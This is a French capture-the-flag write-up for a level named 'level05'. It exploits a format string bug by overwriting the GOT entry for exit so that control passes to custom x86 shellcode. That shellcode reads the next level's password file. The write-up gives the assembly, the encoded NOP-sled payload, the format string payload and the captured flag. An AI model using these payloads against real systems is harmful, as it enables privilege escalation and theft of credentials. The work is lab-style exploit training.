On remarque qu'il y a un format string bug.
On ne peut pas reecrire eip car il y a un exit.
On peut par contre reecrire l'entree dans la GOT correspondant à exit. En effet, cela permettra d'appeler un
shellcode a nous au lieu d'appeler exit.

.text
.global _start
_start:

jmp ender
starter:
xor %eax,%eax
movb $0x5, %al
pop %ebx
xor %ecx,%ecx
xor %edx, %edx
movw $0x1ff, %dx
int $0x80

mov $0xffffbfdc, %ecx
mov %eax, %ebx
xor %eax, %eax
movb $0x3, %al
xor %edx, %edx
movb $0x29, %dl
int $0x80

mov %eax, %edx
xor %eax,%eax
movb $0x4,%al
xor %ebx,%ebx
movb $1, %bl
int $0x80
ret
ender:
call starter
.ascii "/home/users/level06/.pass"

On cree un shellcode exactement comme dans le leve03 et on le met dans l'environnement.
export BINSH=`python -c "print '\x90' * 10000 + '\xeb\x2d\x31\xc0\xb0\x05\x5b\x31\xc9\x31\xd2\x66\xba\xff\x01\xcd\x80\xb9\xdc\xbf\xff\xff\x89\xc3\x31\xc0\xb0\x03\x31\xd2\xb2\x29\xcd\x80\x89\xc2\x31\xc0\xb0\x04\x31\xdb\xb3\x01\xcd\x80\xc3\xe8\xce\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x75\x73\x65\x72\x73\x2f\x6c\x65\x76\x65\x6c\x30\x36\x2f\x2e\x70\x61\x73\x73'"`

On trouve avec gdb l'adresse dans la .got.plt de exit. On aurait egalement pu la trouver avec readelf :
readelf --relocs /home/users/level05/level05

On va donc devoir ecrire 0xffffbfdc à l'adresse 0x80497e0
Et ça marche.
Flag : h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq

python -c "print '\xe0''\x97''\x04''\x08' + '\xe2''\x97''\x04''\x08'+ '%049108x' + '%10\$hn' + '%016419x' + '%11\$hn'" | /home/users/level05/level05
